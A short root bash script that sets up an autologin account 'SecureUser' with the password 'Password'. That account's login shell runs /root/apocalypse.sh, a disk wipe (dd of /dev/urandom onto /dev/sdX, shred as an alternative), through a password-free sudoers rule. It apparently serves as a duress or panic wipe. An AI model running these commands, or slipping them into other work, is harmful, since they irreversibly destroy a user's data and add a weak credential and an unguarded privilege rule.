#!/bin/bash

# Check if the script is being run as root
if [ "$(id -u)" != "0" ]; then
   echo "This script must be run as root" 1>&2
   exit 1
fi

# Create the new user SecureUser with password Password
useradd -m -s /bin/bash SecureUser
echo "SecureUser:Password" | chpasswd

# Allow SecureUser to access GUI (lightdm)
if [ -f /etc/lightdm/lightdm.conf ]; then
  sed -i '/^autologin-user=/d' /etc/lightdm/lightdm.conf
  echo "autologin-user=SecureUser" >> /etc/lightdm/lightdm.conf
fi

# Create the script in /root/
cat > /root/apocalypse.sh <<EOL
#!/bin/bash
sudo dd if=/dev/urandom of=/dev/sdX bs=64M status=progress #WARNING!!!
#alternative → shred -n 2 -z /dev/sdX
#alternative2 → fstrim -v /
EOL

# Make the script executable
chmod +x /root/apocalypse.sh

# Configure SecureUser to run the script at login
echo "xterm -e 'sudo /root/apocalypse.sh' &" >> /home/SecureUser/.bashrc

# Add SecureUser to sudoers file
echo "SecureUser ALL=(ALL:ALL) NOPASSWD: /root/apocalypse.sh" | tee -a /etc/sudoers.d/secure_user

# Apply correct permissions to the sudoers file
chmod 0440 /etc/sudoers.d/secure_user
